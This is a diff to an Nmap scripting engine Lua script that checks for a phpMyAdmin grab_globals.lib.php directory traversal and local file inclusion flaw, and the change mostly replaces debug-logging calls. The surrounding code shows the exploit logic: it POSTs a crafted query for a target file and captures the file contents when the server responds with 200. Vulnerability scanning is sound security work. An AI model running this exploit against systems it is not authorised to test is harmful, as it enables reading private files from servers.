@@ -99,8 +99,8 @@ action = function(host, port)
   local rfile = stdnse.get_script_args("http-phpmyadmin-dir-traversal.file") or DEFAULT_FILE
   local evil_postdata = EXPLOIT_QUERY:format(rfile)
   local filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
-  stdnse.print_debug(1, "%s: HTTP POST %s%s", SCRIPT_NAME, stdnse.get_hostname(host), evil_uri)
-  stdnse.print_debug(1, "%s: POST DATA %s", SCRIPT_NAME, evil_postdata)
+  stdnse.debug1("HTTP POST %s%s", stdnse.get_hostname(host), evil_uri)
+  stdnse.debug1("POST DATA %s", evil_postdata)
 
   local vuln = {
     title = 'phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion',
@@ -121,7 +121,7 @@ action = function(host, port)
   local response = http.post(host, port, evil_uri,
     {header = {["Content-Type"] = "application/x-www-form-urlencoded"}}, nil, evil_postdata)
   if response.body and response.status==200 then
-    stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
+    stdnse.debug1("response : %s", response.body)
     vuln.state = vulns.STATE.EXPLOIT
     vuln.extra_info = rfile.." :\n"..response.body
     if filewrite then
@@ -135,7 +135,7 @@ action = function(host, port)
   elseif response.status==500 then
     vuln.state = vulns.STATE.LIKELY_VULN
     stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
-    stdnse.print_debug(1, "%s: response : %s", SCRIPT_NAME, response.body)
+    stdnse.debug1("response : %s", response.body)
     vuln.extra_info = string.format("%s not found.\n", rfile)
   end
   return vuln_report:make_output(vuln)
